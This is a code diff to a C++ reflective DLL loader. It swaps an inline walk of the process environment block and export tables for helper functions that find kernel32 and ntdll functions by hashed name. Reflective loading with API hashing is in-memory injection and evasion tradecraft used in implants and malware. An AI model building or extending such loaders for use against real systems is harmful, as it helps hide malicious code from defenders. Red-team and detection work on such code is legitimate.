@@ -36,143 +36,23 @@ DLLEXPORT BOOL ReflectiveDllLoader(LPVOID lpParameter)
 		pPeb = (PPEB)__readfsqword(0x30);
     #endif
 
-	Procs::LPPROC_LOADLIBRARYA lpLoadLibraryA     = nullptr;
-	Procs::LPPROC_GETPROCADDRESS lpGetProcAddress = nullptr;
-	Procs::LPPROC_VIRTUALALLOC lpVirtualAlloc     = nullptr;
-	Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE lpNtFlushInstructionCache = nullptr;
+	// Get modules and functions
+	HMODULE hNtdll = (HMODULE)Procs::GetModuleByHash(HASH_NTDLLDLL);
+	if (!hNtdll)
+	{
+		return FALSE;
+	}
 
-	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;
-	// Get the first entry
-	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pLdr->InLoadOrderModuleList.Flink;
+	HMODULE hKernel32 = (HMODULE)Procs::GetModuleByHash(HASH_KERNEL32DLL);
+	if (!hKernel32)
+	{
+		return FALSE;
+	}
 
-    while (pDte)
-    {
-        ULONG_PTR uCurrModuleName = (ULONG_PTR)pDte->BaseDllName.Buffer;
-        USHORT uCurrModuleNameLen = pDte->BaseDllName.Length;
-    	DWORD dwHash = 0;
-
-        do
-        {
-            dwHash = rotate(dwHash);
-			// if a character is lowercase, convert to uppercase.
-            if (*((BYTE*)uCurrModuleName) >= 'a')
-                dwHash += *((BYTE*)uCurrModuleName) - 0x20;
-            else
-                dwHash += *((BYTE*)uCurrModuleName);
-            uCurrModuleName++;
-        } while (--uCurrModuleNameLen);
-
-		// dwHash = HASH_IV;
-        // do
-        // {
-		// 	int c;
-		// 	// if a character is lowercase, convert it to uppercase.
-        //     if (*((BYTE*)uCurrModuleName) >= 'a')
-        //         c = *((BYTE*)uCurrModuleName) - 0x20;
-        //     else
-        //         c = *((BYTE*)uCurrModuleName);
-
-		// 	dwHash = dwHash * RANDOM_ADDR + c;
-        //     uCurrModuleName++;
-        // } while (--uCurrModuleNameLen);
-		// dwHash = dwHash & 0xFFFFFFFF;
-
-        if (dwHash == HASH_KERNEL32DLL)
-        // if (dwHash == HASH_MODULE_KERNEL32)
-		// if (Procs::GetHashFromStringPtr((PVOID)pDte->BaseDllName.Buffer, pDte->BaseDllName.Length) == HASH_MODULE_KERNEL32)
-		{
-			ULONG_PTR uDllBase = (ULONG_PTR)pDte->DllBase;
-			PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uDllBase + ((PIMAGE_DOS_HEADER)uDllBase)->e_lfanew);
-			PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)&(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
-			PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uDllBase + pDataDir->VirtualAddress);
-			
-			ULONG_PTR uFuncNames = uDllBase + pExportDir->AddressOfNames;
-			ULONG_PTR uFuncNameOrdinals = uDllBase + pExportDir->AddressOfNameOrdinals;
-
-			uCurrModuleNameLen = 3;
-
-            while (uCurrModuleNameLen > 0)
-            {
-				DWORD dwFuncHash = Procs::GetHashFromString((char*)(uDllBase + DEREF_32(uFuncNames)));
-				
-				// if we have found a function we want we get its virtual address
-				if(
-                    dwFuncHash == HASH_FUNC_LOADLIBRARYA ||
-                    dwFuncHash == HASH_FUNC_GETPROCADDRESS ||
-                    dwFuncHash == HASH_FUNC_VIRTUALALLOC
-                ) {
-					ULONG_PTR uFuncAddresses = uDllBase + pExportDir->AddressOfFunctions;
-
-					// use this functions name ordinal as an index into the array of name pointers
-					uFuncAddresses += (DEREF_16(uFuncNameOrdinals) * sizeof(DWORD));
-
-					// store this functions VA
-					if(dwFuncHash == HASH_FUNC_LOADLIBRARYA)
-						lpLoadLibraryA = (Procs::LPPROC_LOADLIBRARYA)(uDllBase + DEREF_32(uFuncAddresses));
-					else if(dwFuncHash == HASH_FUNC_GETPROCADDRESS)
-						lpGetProcAddress = (Procs::LPPROC_GETPROCADDRESS)(uDllBase + DEREF_32(uFuncAddresses));
-					else if(dwFuncHash == HASH_FUNC_VIRTUALALLOC )
-						lpVirtualAlloc = (Procs::LPPROC_VIRTUALALLOC)(uDllBase + DEREF_32(uFuncAddresses));
-			
-					// decrement our counter
-					uCurrModuleNameLen--;
-				}
-
-				// get the next exported function name
-				uFuncNames += sizeof(DWORD);
-				// get the next exported function name ordinal
-				uFuncNameOrdinals += sizeof(WORD);
-            }
-        }
-        else if (dwHash == HASH_NTDLLDLL)
-        // else if (dwHash == HASH_MODULE_NTDLL)
-		// else if (Procs::GetHashFromStringPtr((PVOID)pDte->BaseDllName.Buffer, pDte->BaseDllName.Length) == HASH_MODULE_NTDLL)
-		{
-			ULONG_PTR uDllBase = (ULONG_PTR)pDte->DllBase;
-			PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uDllBase + ((PIMAGE_DOS_HEADER)uDllBase)->e_lfanew);
-			PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];			
-			PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uDllBase + pDataDir->VirtualAddress);
-			
-			ULONG_PTR uFuncNames = (uDllBase + pExportDir->AddressOfNames);
-			ULONG_PTR uFuncNameOrdinals = (uDllBase + pExportDir->AddressOfNameOrdinals);
-
-			uCurrModuleNameLen = 1;
-
-            // loop while we still have imports to find
-			while(uCurrModuleNameLen > 0)
-			{
-				DWORD dwFuncHash = Procs::GetHashFromString((char*)(uDllBase + DEREF_32(uFuncNames)));
-				
-				// if we have found a function we want we get its virtual address
-				if(dwFuncHash == HASH_FUNC_NTFLUSHINSTRUCTIONCACHE)
-				{
-					// get the VA for the array of addresses
-					ULONG_PTR uFuncAddresses = uDllBase + pExportDir->AddressOfFunctions;
-
-					// use this functions name ordinal as an index into the array of name pointers
-					uFuncAddresses += (DEREF_16(uFuncNameOrdinals) * sizeof(DWORD));
-
-					// store this functions VA
-					if(dwFuncHash == HASH_FUNC_NTFLUSHINSTRUCTIONCACHE)
-						lpNtFlushInstructionCache = (Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE)(uDllBase + DEREF_32(uFuncAddresses));
-
-					// decrement our counter
-					uCurrModuleNameLen--;
-				}
-
-				// get the next exported function name
-				uFuncNames += sizeof(DWORD);
-				// get the next exported function name ordinal
-				uFuncNameOrdinals += sizeof(WORD);
-			}
-        }
-
-        if (lpLoadLibraryA && lpGetProcAddress && lpVirtualAlloc && lpNtFlushInstructionCache)
-            break;
-
-		// Get the next entry
-		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
-    }
+	Procs::LPPROC_LOADLIBRARYA lpLoadLibraryA = reinterpret_cast<Procs::LPPROC_LOADLIBRARYA>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYA));
+	Procs::LPPROC_GETPROCADDRESS lpGetProcAddress = reinterpret_cast<Procs::LPPROC_GETPROCADDRESS>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_GETPROCADDRESS));
+	Procs::LPPROC_VIRTUALALLOC lpVirtualAlloc = reinterpret_cast<Procs::LPPROC_VIRTUALALLOC>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALALLOC));
+	Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE lpNtFlushInstructionCache = reinterpret_cast<Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE>(Procs::GetProcAddressByHash(hNtdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE));
 
     // get the VA of the NT Header for the PE to be loaded
 	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uLibAddr + ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew);
